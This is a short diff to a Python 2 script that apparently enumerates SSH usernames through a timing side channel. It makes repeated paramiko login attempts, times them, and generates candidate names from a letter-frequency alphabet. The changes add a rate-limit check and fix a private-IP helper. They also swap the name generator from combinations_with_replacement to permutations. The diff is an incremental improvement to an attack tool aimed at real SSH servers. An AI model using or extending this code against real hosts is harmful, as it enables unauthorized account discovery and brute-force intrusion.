@@ -96,6 +96,9 @@ def sidechan(user,machine,pass_len):
 		ssh.connect(machine, username=user, password=token)
 	except paramiko.AuthenticationException,e:
 		pass
+	except socket.error,e:
+		print "There is some rate limiting of SSH attempts here."
+		sys.exit()
 	timeDone = int(time.time())
 	#simple time calculation
 	timeRes = timeDone-timeStart
@@ -120,7 +123,7 @@ def is_private(ip):
 		m.group(0)
 		return True
 	except AttributeError,e:
-		return True
+		return False
 
 def is_ipv4(ip):
 	try:
@@ -201,7 +204,7 @@ if ans == "y":
 	print "However, you will be informed as soon as a user is found."
 	tested = 0
 	for i in range(int(min_len), int(max_len)+1, 1):
-		x = itertools.combinations_with_replacement('etaoinshrdlcumwfgypbvkjxqz1234567890', i)
+		x = itertools.permutations('etaoinshrdlcumwfgypbvkjxqz1234567890', i)
 		for tup in x:
 			name = ''
 			for element in tup:
